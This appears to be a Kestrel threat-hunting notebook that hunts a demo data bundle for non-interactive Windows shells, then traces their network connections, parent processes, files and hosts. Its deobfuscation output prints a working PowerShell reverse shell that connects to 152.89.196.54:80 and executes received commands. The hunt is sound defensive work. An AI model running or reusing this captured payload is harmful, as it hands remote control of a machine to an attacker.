{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "e9bb422b",
   "metadata": {
    "vscode": {
     "languageId": "kestrel"
    }
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": []
    },
    {
     "data": {
      "text/html": [
       "<div><h4>Block Executed in 1 seconds</h4><table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th>VARIABLE</th>\n",
       "      <th>TYPE</th>\n",
       "      <th>#(ENTITIES)</th>\n",
       "      <th>#(RECORDS)</th>\n",
       "      <th>directory*</th>\n",
       "      <th>file*</th>\n",
       "      <th>ipv4-addr*</th>\n",
       "      <th>network-traffic*</th>\n",
       "      <th>process*</th>\n",
       "      <th>user-account*</th>\n",
       "      <th>x-oca-asset*</th>\n",
       "      <th>x-oca-event*</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <td>procs</td>\n",
       "      <td>process</td>\n",
       "      <td>1</td>\n",
       "      <td>3</td>\n",
       "      <td>5</td>\n",
       "      <td>5</td>\n",
       "      <td>2</td>\n",
       "      <td>1</td>\n",
       "      <td>4</td>\n",
       "      <td>3</td>\n",
       "      <td>3</td>\n",
       "      <td>5</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table><p>*Number of related records cached.</p></div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Find Windows shells launched non-interactively (i.e. not from explorer.exe)\n",
    "procs = GET process FROM https://stix-bundles.s3.us-east.cloud-object-storage.appdomain.cloud/demo_bundle.json\n",
    "        WHERE [process:binary_ref.name IN ('cmd.exe', 'powershell.exe') AND process:parent_ref.binary_ref.name != 'explorer.exe'] "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "a0acaf50",
   "metadata": {
    "scrolled": true,
    "vscode": {
     "languageId": "plaintext"
    }
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": []
    },
    {
     "data": {
      "text/html": [
       "<br/>Row 1: process--62ccf4b1-d62a-52dd-a682-37b3fcc9de65\n",
       "<hr/>\n",
       "<pre>\n",
       "$client = new-object system.net.sockets.tcpclient(&#x27;152.89.196.54&#x27;, 80);\n",
       "$stream = $client.getstream();\n",
       "[byte[]]$bytes = 0..65535 | % {\n",
       "    0\n",
       "}\n",
       "while (($i = $stream.read($bytes, 0, $bytes.length)) -ne 0) {\n",
       "    ;\n",
       "    $data = ( new-object -typename system.text.asciiencoding).getstring($bytes, 0, $i);\n",
       "    $sendback = (iex&quot;. { $data } 2&gt;&amp;1&quot; | out-string );\n",
       "    $sendback2 = $sendback + &#x27;PS &#x27; + (pwd).path + &#x27;&gt; &#x27;;\n",
       "    $sendbyte = ([text.encoding]::ascii).getbytes($sendback2);\n",
       "    $stream.write($sendbyte, 0, $sendbyte.length);\n",
       "    $stream.flush()\n",
       "}\n",
       "$client.close()\r\n",
       "</pre>\n",
       "\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Powershell deobfuscation analytic\n",
    "APPLY python://psd on procs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "cfd0aaff",
   "metadata": {
    "vscode": {
     "languageId": "kestrel"
    }
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": []
    },
    {
     "data": {
      "text/html": [
       "<div><h4>Block Executed in 1 seconds</h4><table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th>VARIABLE</th>\n",
       "      <th>TYPE</th>\n",
       "      <th>#(ENTITIES)</th>\n",
       "      <th>#(RECORDS)</th>\n",
       "      <th>directory*</th>\n",
       "      <th>file*</th>\n",
       "      <th>ipv4-addr*</th>\n",
       "      <th>network-traffic*</th>\n",
       "      <th>process*</th>\n",
       "      <th>user-account*</th>\n",
       "      <th>x-oca-asset*</th>\n",
       "      <th>x-oca-event*</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <td>conns</td>\n",
       "      <td>network-traffic</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>3</td>\n",
       "      <td>3</td>\n",
       "      <td>2</td>\n",
       "      <td>0</td>\n",
       "      <td>3</td>\n",
       "      <td>2</td>\n",
       "      <td>2</td>\n",
       "      <td>3</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table><p>*Number of related records cached.</p></div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Find the netconns created by powershell\n",
    "conns = FIND network-traffic CREATED BY procs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "aaa30244",
   "metadata": {
    "vscode": {
     "languageId": "kestrel"
    }
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": []
    },
    {
     "data": {
      "text/html": []
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Apply Threat Intelligence Service (TIS) enrichment on those connections \n",
    "APPLY python://xfeenrich ON conns"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "8dd9ec78",
   "metadata": {
    "vscode": {
     "languageId": "kestrel"
    }
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": []
    },
    {
     "data": {
      "text/html": [
       "<div><h4>Block Executed in 1 seconds</h4><table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th>VARIABLE</th>\n",
       "      <th>TYPE</th>\n",
       "      <th>#(ENTITIES)</th>\n",
       "      <th>#(RECORDS)</th>\n",
       "      <th>directory*</th>\n",
       "      <th>file*</th>\n",
       "      <th>ipv4-addr*</th>\n",
       "      <th>network-traffic*</th>\n",
       "      <th>process*</th>\n",
       "      <th>user-account*</th>\n",
       "      <th>x-oca-asset*</th>\n",
       "      <th>x-oca-event*</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <td>parents</td>\n",
       "      <td>process</td>\n",
       "      <td>1</td>\n",
       "      <td>4</td>\n",
       "      <td>9</td>\n",
       "      <td>9</td>\n",
       "      <td>2</td>\n",
       "      <td>1</td>\n",
       "      <td>8</td>\n",
       "      <td>5</td>\n",
       "      <td>5</td>\n",
       "      <td>11</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table><p>*Number of related records cached.</p></div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Find the process(es) that created those shells\n",
    "parents = FIND process CREATED procs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "a13cbda8",
   "metadata": {
    "vscode": {
     "languageId": "kestrel"
    }
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": []
    },
    {
     "data": {
      "text/html": [
       "<div><h4>Block Executed in 1 seconds</h4><table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th>VARIABLE</th>\n",
       "      <th>TYPE</th>\n",
       "      <th>#(ENTITIES)</th>\n",
       "      <th>#(RECORDS)</th>\n",
       "      <th>directory*</th>\n",
       "      <th>file*</th>\n",
       "      <th>ipv4-addr*</th>\n",
       "      <th>network-traffic*</th>\n",
       "      <th>process*</th>\n",
       "      <th>user-account*</th>\n",
       "      <th>x-oca-asset*</th>\n",
       "      <th>x-oca-event*</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <td>files</td>\n",
       "      <td>file</td>\n",
       "      <td>5</td>\n",
       "      <td>15</td>\n",
       "      <td>17</td>\n",
       "      <td>12</td>\n",
       "      <td>4</td>\n",
       "      <td>2</td>\n",
       "      <td>16</td>\n",
       "      <td>9</td>\n",
       "      <td>9</td>\n",
       "      <td>25</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table><p>*Number of related records cached.</p></div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Look for any files touched by the parent process (i.e the ones that launched the shells)\n",
    "files = FIND file LINKED parents"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c6af6d58",
   "metadata": {
    "vscode": {
     "languageId": "kestrel"
    }
   },
   "outputs": [],
   "source": [
    "# Look up the hashes of those files\n",
    "#APPLY tis-enrich ON files"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "89cac979",
   "metadata": {
    "vscode": {
     "languageId": "kestrel"
    }
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": []
    },
    {
     "data": {
      "text/html": [
       "<div><h4>Block Executed in 1 seconds</h4><table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th>VARIABLE</th>\n",
       "      <th>TYPE</th>\n",
       "      <th>#(ENTITIES)</th>\n",
       "      <th>#(RECORDS)</th>\n",
       "      <th>directory*</th>\n",
       "      <th>file*</th>\n",
       "      <th>ipv4-addr*</th>\n",
       "      <th>network-traffic*</th>\n",
       "      <th>process*</th>\n",
       "      <th>user-account*</th>\n",
       "      <th>x-oca-asset*</th>\n",
       "      <th>x-oca-event*</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <td>susp_files</td>\n",
       "      <td>file</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table><p>*Number of related records cached.</p></div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Filter those files looking for Word docs\n",
    "susp_files = files WHERE name LIKE '%.docx'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "e3129b15",
   "metadata": {
    "vscode": {
     "languageId": "kestrel"
    }
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": []
    },
    {
     "data": {
      "text/html": [
       "<div><h4>Block Executed in 1 seconds</h4><table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th>VARIABLE</th>\n",
       "      <th>TYPE</th>\n",
       "      <th>#(ENTITIES)</th>\n",
       "      <th>#(RECORDS)</th>\n",
       "      <th>directory*</th>\n",
       "      <th>file*</th>\n",
       "      <th>ipv4-addr*</th>\n",
       "      <th>network-traffic*</th>\n",
       "      <th>process*</th>\n",
       "      <th>user-account*</th>\n",
       "      <th>x-oca-asset*</th>\n",
       "      <th>x-oca-event*</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <td>assets</td>\n",
       "      <td>x-oca-asset</td>\n",
       "      <td>1</td>\n",
       "      <td>9</td>\n",
       "      <td>17</td>\n",
       "      <td>17</td>\n",
       "      <td>4</td>\n",
       "      <td>2</td>\n",
       "      <td>16</td>\n",
       "      <td>9</td>\n",
       "      <td>8</td>\n",
       "      <td>25</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table><p>*Number of related records cached.</p></div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Find all my assets where this all happened\n",
    "assets = FIND x-oca-asset LINKED procs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "0b5181b5",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": []
    },
    {
     "data": {
      "text/html": [
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th>dst_port</th>\n",
       "      <th>protocols</th>\n",
       "      <th>src_port</th>\n",
       "      <th>id</th>\n",
       "      <th>dst_ref.value</th>\n",
       "      <th>dst_ref.id</th>\n",
       "      <th>src_ref.value</th>\n",
       "      <th>src_ref.id</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <td>80</td>\n",
       "      <td>[\"ipv4\",\"tcp\"]</td>\n",
       "      <td>65311</td>\n",
       "      <td>network-traffic--5f0c1037-731c-5494-8f42-32a5e8d8ca36</td>\n",
       "      <td>152.89.196.54</td>\n",
       "      <td>ipv4-addr--b8cebe95-e8ae-5060-b2d8-6bcdccc65957</td>\n",
       "      <td>192.168.1.108</td>\n",
       "      <td>ipv4-addr--93aef2d0-9209-5529-96f0-d768d5b8e8b8</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "disp conns"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ad189ee1",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Kestrel",
   "language": "kestrel",
   "name": "kestrel"
  },
  "language_info": {
   "file_extension": ".hf",
   "name": "kestrel"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
